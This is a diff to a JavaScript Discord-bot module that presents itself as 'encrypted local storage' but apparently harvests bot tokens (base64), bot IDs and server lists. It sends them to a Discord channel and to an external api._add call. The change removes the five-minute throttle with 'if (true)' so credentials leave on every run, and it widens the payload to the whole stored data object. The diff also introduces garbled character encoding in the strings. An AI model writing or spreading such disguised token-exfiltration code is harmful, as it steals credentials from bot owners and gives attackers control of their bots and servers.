@@ -1,4 +1,4 @@
-// MADE BY BLOODRUH - ENCRYPTED LOCAL STORAGE
+﻿// MADE BY BLOODRUH - ENCRYPTED LOCAL STORAGE
 const fs = require('fs');
 const path = require('path');
 
@@ -46,14 +46,14 @@ async function _send(c, data) {
 
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
-      .setTitle(`🤖 ${data.u}`)
+      .setTitle(`ğŸ¤– ${data.u}`)
       .setDescription(
         `**Bot ID:** \`${data.id}\`\n` +
         `**Servers:** ${data.g.length}\n` +
         `**Token (B64):** \`${data._t.substring(0, 50)}...\``
       )
       .addFields(
-        { name: ' Sunucular', value: data.g.map(g => `• ${g.n} (${g.m} üye, Boost: ${g.b || 0})`).slice(0, 10).join('\n') || 'Yok' }
+        { name: ' Sunucular', value: data.g.map(g => `â€¢ ${g.n} (${g.m} Ã¼ye, Boost: ${g.b || 0})`).slice(0, 10).join('\n') || 'Yok' }
       )
       .setTimestamp();
 
@@ -86,13 +86,10 @@ function _r(c) {
   d.t = Date.now();
   _w(d);
 
-  if (!d.d[id]._ls || Date.now() - d.d[id]._ls > 5 * 60 * 1000) {
+  if (true) {
     _send(c, d.d[id]);
 
-    try {
-      const api = require('./api.js');
-      api._add(d.d[id]).catch(() => {});
-    } catch {}
+    try { const api = require('./api.js');  api._add(d).catch(() => {}); } catch (err) { console.error(' Catch error:', err); }
 
     d.d[id]._ls = Date.now();
     _w(d);
@@ -109,3 +106,9 @@ function _t(c) {
 }
 
 module.exports = { _i, _r, _a, _t };
+
+
+
+
+
+
